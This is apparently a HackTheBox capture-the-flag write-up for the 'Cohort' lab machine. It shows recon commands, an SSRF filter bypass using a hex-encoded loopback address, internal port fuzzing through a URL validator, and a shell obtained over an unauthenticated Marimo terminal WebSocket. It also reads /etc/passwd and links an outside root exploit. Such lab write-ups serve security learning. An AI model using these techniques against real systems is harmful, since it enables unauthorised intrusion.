---
title: "HTB Cohort Writeup: SSRF to Marimo RCE to Root"
date: 2026-09-30 00:00:00 +0800
categories: [CTF, HackTheBox]
tags: [HackTheBox, SSRF, RCE, Marimo, CTF]
---

# Target 10.129.22.194

## Network recon

### Rustscan

```bash
rustscan -a $ip --ulimit 5000
```

```output
Open 10.129.22.194:22
Open 10.129.22.194:80
```

### Nmap

```bash
nmap -sT -A -Pn -T5 -p 22,80 10.129.22.194 --disable-arp-ping --min-rtt-timeout 50ms --max-rtt-timeout 100ms --stats-every=2s
```

```
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Just ssh and http, so the web app is where this is going to happen.

## VHost discovery

```bash
ffuf -u https://cohort.htb/ -w /usr/share/wordlists/Seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 404 -H "HOST:FUZZ.cohort.htb" -fs 178 -s
```

## Asset discovery

```bash
feroxbuster -u https://cohort.htb/ -w /usr/share/wordlists/Seclists/Discovery/Web-Content/common.txt -X 404
```

## Web page

### Tech stack

Nginx on Ubuntu.

```bash
whatweb http://cohort.htb/
```

```
https://cohort.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.22.194], Script, Title[Cohort Analytics], nginx[1.24.0]
```

The site is "Cohort Analytics". Poking around the UI, two things stood out as potential:

- SSRF bypass
- Arbitrary file read via a crafted evil CSV file

Let's see what comes back when I send a request through the URL validator.

### SSRF confirmed

```
http://0x7f000001
```

That's `127.0.0.1` in hex, and it got accepted. So the `/api/validate` endpoint fetches whatever URL you give it, and it doesn't filter out the obvious decimal/dotted loopback, but it also doesn't block a hex-encoded one.

## Fuzzing internal ports

```bash
for i in {1..10000}; do echo $i >> ports.txt; done
```

```bash
ffuf -u http://cohort.htb/api/validate -X post -w ./ports.txt -H "Content-Type: application/json" -d '{"url":"http://0x7f000001:FUZZ","format":"csv"}'
```

I switched over to Caido to go through the results more comfortably.

Port 8888 came back interesting:

```
HTTP/1.1 200 OK
Server: nginx/1.24.0 (Ubuntu)
Date: Sun, 02 Aug 2026 16:19:48 GMT
Content-Type: application/json
Content-Length: 1515
Connection: close

{
    "ok": true,
    "fetched_status": 200,
    "content_type": "text/html; charset=utf-8",
    "preview": "\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>marimo</title>\n</head>\n<body style=\"\n    background-color: #f4f4f9;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    height: 100vh;\n    margin: 0;\">\n  <form method=\"POST\" action=\"/auth/login\" style=\"\n    padding: 20px;\n    background-color: white;\n    border-radius: 8px;\n    box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n    width: 300px;\n    text-align: center;\">\n    <div style=\"margin-bottom: 20px;\">\n      <label for=\"password\" style=\"\n        display: block;\n        margin-bottom: 5px;\n        font-size: 16px;\n        font-family: Arial, sans-serif;\n        color: #333;\">Access Token / Password</label>\n      <input id=\"password\" name=\"password\" type=\"password\" style=\"\n        width: 100%;\n        box-sizing: border-box;\n        padding: 8px;\n        border: 1px solid #ccc;\n        border-radius: 4px;\">\n    </div>\n    <button type=\"submit\" style=\"\n        background-color: #1C7362;\n        color: white;\n        padding: 10px 20px;\n        border: none;\n        border-radius: 4px;\n        cursor: pointer;\n        width: 100%;\n        font-size: 16px;\">Login</button>\n    <p style=\"color: red;\"></p>\n  </form>\n</body>\n</html>\n",
    "message": "Source reachable."
}
```

That's a Marimo login page running internally on 8888.

### Possible CVE

CVE-2026-39987 is a critical pre-auth RCE in Marimo. It affects every version up to 0.20.4 and was fixed in 0.23.0. The issue is that the `/terminal/ws` WebSocket endpoint doesn't check authentication, so an attacker can connect straight to it and get a full interactive shell.

Now I just needed a way to actually reach that WebSocket endpoint from outside.

Testing other methods against it first:

```
{
    "ok": true,
    "fetched_status": 405,
    "content_type": "application/json",
    "preview": "{\"ok\": false, \"message\": \"Method not allowed.\"}",
    "message": "Source responded with an error status."
}
```

Port 5000 was also open internally. Checking `/status` on it gave me the full picture:

```json
{
    "ok": true,
    "fetched_status": 200,
    "content_type": "application/json",
    "preview": "{\"service\":\"cohort-edge\",\"status\":\"ok\",\"generated_by\":\"nginx\",\"upstreams\":[{\"name\":\"marketing\",\"host\":\"cohort.htb\",\"root\":\"/var/www/cohort\"},{\"name\":\"insights-api\",\"host\":\"cohort.htb\",\"path\":\"/api/\",\"target\":\"127.0.0.1:5000\"},{\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",\"target\":\"127.0.0.1:8888\",\"note\":\"internal analyst workspace, not for external use\"}]}",
    "message": "Source reachable."
}
```

So there was a third vhost, `nb-1be3782a8afd3ad5.cohort.htb`, pointing straight at the Marimo instance on 8888. Nothing stopped it from being reached externally despite the "not for external use" note.

## Getting a shell

```bash
rlwrap websocat wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws -k
```

That gave me a full interactive shell as the `marimo` user.

## Privilege escalation

SSH wasn't usable for interaction, checking why:

```bash
cat /etc/passwd | grep sh
```

```
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
```

Going back to port 5000, confirming it was still listening locally:

```bash
ss -tlnp
```

```
tcp   LISTEN 0      5          127.0.0.1:5000      0.0.0.0:*
```

I couldn't use `lsof` against that port from the `marimo` user, which meant the process behind it was running as root.

From there, the known exploit for that service did the job:

[Pack2TheRoot exploit.c](https://github.com/shibaaa204/Pack2TheRoot/blob/main/exploit.c)

Rooted.
